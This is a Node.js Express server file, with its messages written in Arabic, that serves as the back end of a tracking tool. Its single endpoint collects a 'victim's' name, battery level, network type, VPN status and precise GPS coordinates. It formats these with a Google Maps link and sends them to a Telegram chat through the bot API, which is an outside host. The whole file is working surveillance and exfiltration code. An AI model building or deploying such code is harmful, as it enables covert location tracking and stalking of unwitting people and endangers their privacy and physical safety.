import express from 'express';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static('.'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/api/send-all-data', async (req, res) => {
  const { username, battery, speed, signal, network, connectionType, location, vpn } = req.body;
  
  if (!username) {
    return res.status(400).json({ error: 'missing username' });
  }

  try {
    let message = `📱 بيانات الضحية:\n\n`;
    message += `👤 الاسم: ${username}\n`;
    
    if (battery !== undefined) {
      message += `🔋 البطارية: ${battery}%\n`;
    }
    
    if (speed) {
      message += `⚡ السرعة: ${speed}\n`;
    }
    
    if (signal) {
      message += `📊 الإشارة: ${signal}\n`;
    }
    
    if (network) {
      message += `🌐 الشبكة: ${network}\n`;
    }
    
    if (connectionType) {
      message += `📶 نوع الاتصال: ${connectionType}\n`;
    }
    
    if (vpn !== undefined) {
      message += `🔒 VPN: ${vpn ? '✅ مفعل' : '❌ غير مفعل'}\n`;
    }
    
    if (location) {
      message += `📍 الموقع:\n`;
      message += `   خط العرض: ${location.latitude || 'غير معروف'}\n`;
      message += `   خط الطول: ${location.longitude || 'غير معروف'}\n`;
      if (location.accuracy) {
        message += `   الدقة: ${location.accuracy.toFixed(2)} متر\n`;
      }
      if (location.altitude) {
        message += `   الارتفاع: ${location.altitude.toFixed(2)} متر\n`;
      }
      if (location.speed) {
        message += `   السرعة: ${location.speed.toFixed(2)} م/ث\n`;
      }
      // رابط خرائط جوجل
      if (location.latitude && location.longitude) {
        message += `   🗺️ https://www.google.com/maps?q=${location.latitude},${location.longitude}\n`;
      }
    }
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    
    const result = await response.json();
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
